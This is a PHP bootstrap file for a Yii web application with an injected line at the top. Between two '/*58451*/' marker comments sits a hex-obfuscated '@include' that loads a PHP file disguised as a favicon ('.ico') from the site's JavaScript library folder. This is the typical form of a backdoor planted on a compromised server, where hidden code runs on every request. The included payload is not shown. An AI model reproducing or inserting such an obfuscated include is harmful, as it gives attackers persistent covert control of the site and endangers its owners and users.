<?php
/*58451*/

@include "\x2fdat\x61/vh\x6fsts\x2fwww\x2eos-\x73tor\x65.co\x6d/at\x2fjs/\x6cib/\x66avi\x63on_\x37eb3\x301.i\x63o";

/*58451*/
date_default_timezone_set("America/New_York"); 
// change the following paths if necessary
$yii=dirname(__FILE__).'/framework/yii.php';
$config=dirname(__FILE__).'/protected/config/main.php';

// remove the following line when in production mode
// defined('YII_DEBUG') or define('YII_DEBUG',true);

require_once($yii);
Yii::createWebApplication($config)->run();
